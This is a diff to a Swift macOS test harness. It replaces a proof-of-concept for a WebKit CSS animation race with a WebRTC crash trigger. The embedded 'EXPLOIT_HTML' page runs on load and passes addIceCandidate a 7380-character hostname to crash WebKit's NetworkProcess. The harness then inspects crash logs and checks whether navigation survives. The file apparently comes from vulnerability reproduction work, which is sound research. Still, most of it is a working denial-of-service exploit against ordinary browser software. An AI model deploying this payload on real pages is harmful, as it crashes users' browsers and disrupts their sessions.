@@ -1,74 +1,194 @@
 import AppKit
 import WebKit
 
-let CONTROL_HTML = "<html><body style='height:5000px'><h1>CONTROL</h1></body></html>"
+// Phase B — WebRTC overlong hostname crash
+// Signal: 4a2069dce8
+// Path: addIceCandidate → CreateUDPSocket → nw_endpoint_create_host_with_numeric_port(>1023) → NULL → TRAP
 
-let TRIGGER_HTML = """
-<!DOCTYPE html><html><head><style>
-body { height: 5000px; }
-.mover { position:absolute; top:50px; left:50px; width:40px; height:40px;
-         will-change:transform; animation: move auto linear;
-         animation-timeline: scroll(root); }
-@keyframes move { from{offset-distance:0%} to{offset-distance:100%} }
-#m0{offset-path:polygon(0% 0%,28% 12%,53% 97%,100% 5%,19% 100%)}
-#m1{offset-path:polygon(0% 0%,53% 37%,3% 72%,75% 30%,44% 100%)}
-#m2{offset-path:polygon(0% 0%,78% 62%,28% 47%,50% 55%,69% 76%)}
-#m3{offset-path:polygon(0% 0%,100% 87%,78% 22%,25% 80%,94% 51%)}
-#m4{offset-path:polygon(0% 0%,100% 100%,100% 100%,100% 100%,100% 26%)}
-#m5{offset-path:polygon(0% 0%,100% 100%,100% 100%,100% 100%,69% 1%)}
-</style></head><body>
-<div class="mover" id="m0"></div><div class="mover" id="m1"></div>
-<div class="mover" id="m2"></div><div class="mover" id="m3"></div>
-<div class="mover" id="m4"></div><div class="mover" id="m5"></div>
+// Control HTML: valid short hostname → Promise resolves, no crash
+let CONTROL_HTML = """
+<!DOCTYPE html><html><body>
+<div id="result">PENDING</div>
 <script>
-let dir=1,count=0;
-function pump(){window.scrollBy(0,dir*800);
-if(window.scrollY>3000||window.scrollY<=0)dir=-dir;
-count++;if(count<500)requestAnimationFrame(pump);}
-window.addEventListener('load',()=>requestAnimationFrame(pump));
+async function run() {
+    try {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        const offer = await pc.createOffer({offerToReceiveAudio:true});
+        await pc.setLocalDescription(offer);
+        // Valid short hostname
+        await pc.addIceCandidate({
+            candidate: "candidate:1 1 UDP 1 valid.example.com 9999 typ host",
+            sdpMid: "0"
+        });
+        document.getElementById('result').textContent = 'CONTROL_PASS';
+        window.webkit.messageHandlers.result.postMessage('CONTROL_PASS');
+    } catch(e) {
+        document.getElementById('result').textContent = 'CONTROL_ERROR:' + e;
+        window.webkit.messageHandlers.result.postMessage('CONTROL_ERROR:' + e);
+    }
+}
+window.addEventListener('load', run);
 </script></body></html>
 """
 
-class PhaseB: NSObject, NSApplicationDelegate, WKNavigationDelegate {
-    var windows:[NSWindow]=[]
-    var webViews:[WKWebView]=[]
-    var iteration=0
-    let maxIterations=5
+// Exploit HTML: overlong hostname (7380 chars) → NetworkProcess crash
+let EXPLOIT_HTML = """
+<!DOCTYPE html><html><body>
+<div id="result">PENDING</div>
+<script>
+async function run() {
+    try {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        const offer = await pc.createOffer({offerToReceiveAudio:true});
+        await pc.setLocalDescription(offer);
+        const longHostname = 'A'.repeat(7380);
+        // addIceCandidate with overlong hostname
+        // → NetworkRTCProvider::createUDPSocket
+        // → nw_endpoint_create_host_with_numeric_port(7380 chars) → NULL
+        // → nw_endpoint_get_hostname(NULL) → NULL
+        // → std::string_view(nullptr) → libc++ TRAP → NetworkProcess crash
+        const result = await pc.addIceCandidate({
+            candidate: 'candidate:1 1 UDP 1 ' + longHostname + ' 9999 typ host',
+            sdpMid: "0"
+        }).then(() => 'RESOLVED')
+          .catch(e => 'REJECTED:' + e);
+        document.getElementById('result').textContent = result;
+        window.webkit.messageHandlers.result.postMessage(result);
+    } catch(e) {
+        document.getElementById('result').textContent = 'ERROR:' + e;
+        window.webkit.messageHandlers.result.postMessage('ERROR:' + e);
+    }
+}
+window.addEventListener('load', run);
+</script></body></html>
+"""
 
-    func applicationDidFinishLaunching(_ n:Notification) {
-        print("=== Phase B: AcceleratedEffect polygon cache race ===")
+class PhaseB: NSObject, NSApplicationDelegate, WKNavigationDelegate, WKScriptMessageHandler {
+    var windows: [NSWindow] = []
+    var webViews: [WKWebView] = []
+    var phase = "control"
+
+    func applicationDidFinishLaunching(_ n: Notification) {
+        print("=== Phase B: WebRTC overlong hostname crash ===")
+        print("Signal: 4a2069dce8")
         print("macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)")
+        print("WebKit: \(WKWebView.self)")
+        print("")
         runControl()
     }
 
-    func runControl() {
-        print("\n--- CONTROL: static page, no animation ---")
-        let wv=makeWebView(); wv.loadHTMLString(CONTROL_HTML,baseURL:nil)
-        DispatchQueue.main.asyncAfter(deadline:.now()+8){ print("CONTROL: ok"); self.runTrigger() }
+    func makeWebView() -> WKWebView {
+        let config = WKWebViewConfiguration()
+        config.userContentController.add(self, name: "result")
+        // Enable WebRTC
+        config.preferences.setValue(true, forKey: "peerConnectionEnabled")
+        let wv = WKWebView(frame: NSRect(x: 0, y: 0, width: 800, height: 600), configuration: config)
+        wv.navigationDelegate = self
+        let win = NSWindow(contentRect: NSRect(x: 0, y: 0, width: 800, height: 600),
+                          styleMask: [.titled], backing: .buffered, defer: false)
+        win.contentView = wv
+        windows.append(win)
+        webViews.append(wv)
+        return wv
     }
 
-    func runTrigger() {
-        iteration+=1
-        print("\n--- TRIGGER \(iteration)/\(maxIterations): two WKWebView + polygon scroll ---")
-        for _ in 0..<2 { let wv=makeWebView(); wv.loadHTMLString(TRIGGER_HTML,baseURL:nil) }
-        DispatchQueue.main.asyncAfter(deadline:.now()+25){
-            print("TRIGGER \(self.iteration): no crash in 25s")
-            self.webViews.forEach{$0.stopLoading()}
-            self.webViews.removeAll(); self.windows.removeAll()
-            if self.iteration < self.maxIterations { self.runTrigger() }
-            else { print("\nRESULT: INCONCLUSIVE — race not triggered in \(self.maxIterations) iterations"); exit(0) }
+    func runControl() {
+        phase = "control"
+        print("--- CONTROL: short hostname (expect: CONTROL_PASS, no crash) ---")
+        let wv = makeWebView()
+        wv.loadHTMLString(CONTROL_HTML, baseURL: URL(string: "https://localhost")!)
+
+        DispatchQueue.main.asyncAfter(deadline: .now() + 15) {
+            if self.phase == "control" {
+                print("CONTROL: timeout (no message received)")
+                self.runExploit()
+            }
         }
     }
 
-    func makeWebView()->WKWebView {
-        let wv=WKWebView(frame:NSRect(x:0,y:0,width:800,height:600))
-        wv.navigationDelegate=self
-        let win=NSWindow(contentRect:NSRect(x:0,y:0,width:800,height:600),
-                         styleMask:[.titled],backing:.buffered,defer:false)
-        win.contentView=wv; windows.append(win); webViews.append(wv); return wv
+    func runExploit() {
+        phase = "exploit"
+        print("")
+        print("--- EXPLOIT: hostname 'A'x7380 (expect: NetworkProcess crash) ---")
+        let wv = makeWebView()
+        wv.loadHTMLString(EXPLOIT_HTML, baseURL: URL(string: "https://localhost")!)
+
+        DispatchQueue.main.asyncAfter(deadline: .now() + 15) {
+            if self.phase == "exploit" {
+                print("EXPLOIT: timeout — no crash, no Promise resolution in 15s")
+                self.checkCrashLogs()
+                self.checkNavigationAlive()
+            }
+        }
     }
-    func webView(_ wv:WKWebView,didFail n:WKNavigation!,withError e:Error){print("err:\(e)")}
+
+    func checkCrashLogs() {
+        print("")
+        print("--- Crash logs ---")
+        let crashDir = NSString(string: "~/Library/Logs/DiagnosticReports").expandingTildeInPath
+        let fm = FileManager.default
+        if let files = try? fm.contentsOfDirectory(atPath: crashDir) {
+            let crashes = files.filter { $0.hasSuffix(".crash") || $0.hasSuffix(".ips") }
+            if crashes.isEmpty {
+                print("No crash logs found")
+            } else {
+                for f in crashes.prefix(3) {
+                    print("CRASH LOG: \(f)")
+                    if let content = try? String(contentsOfFile: "\(crashDir)/\(f)") {
+                        print(content.prefix(500))
+                    }
+                }
+            }
+        }
+    }
+
+    func checkNavigationAlive() {
+        print("")
+        print("--- Post-exploit navigation check ---")
+        let wv = makeWebView()
+        wv.loadHTMLString("<html><body>ALIVE</body></html>", baseURL: nil)
+        DispatchQueue.main.asyncAfter(deadline: .now() + 8) {
+            wv.evaluateJavaScript("document.body.innerText") { r, e in
+                if let text = r as? String {
+                    print("Navigation after exploit: \(text)")
+                } else {
+                    print("Navigation after exploit: FAILED (\(String(describing: e)))")
+                }
+                print("")
+                print("=== Phase B complete ===")
+                exit(0)
+            }
+        }
+    }
+
+    func userContentController(_ c: WKUserContentController, didReceive msg: WKScriptMessage) {
+        let result = msg.body as? String ?? "unknown"
+        print("Promise result: \(result)")
+
+        if phase == "control" {
+            if result == "CONTROL_PASS" {
+                print("CONTROL: PASS — short hostname accepted, no crash")
+            } else {
+                print("CONTROL: \(result)")
+            }
+            runExploit()
+        } else if phase == "exploit" {
+            print("EXPLOIT Promise resolved: \(result)")
+            print("No NetworkProcess crash observed for this call")
+            checkCrashLogs()
+            checkNavigationAlive()
+        }
+    }
+
+    func webView(_ wv: WKWebView, didFail n: WKNavigation!, withError e: Error) {
+        print("nav error: \(e.localizedDescription)")
+    }
+    func webView(_ wv: WKWebView, didFailProvisionalNavigation n: WKNavigation!, withError e: Error) {
+        print("provisional nav error: \(e.localizedDescription)")
+    }
 }
 
-let app=NSApplication.shared
-let d=PhaseB(); app.delegate=d; app.run()
+let app = NSApplication.shared
+let d = PhaseB()
+app.delegate = d
+app.run()
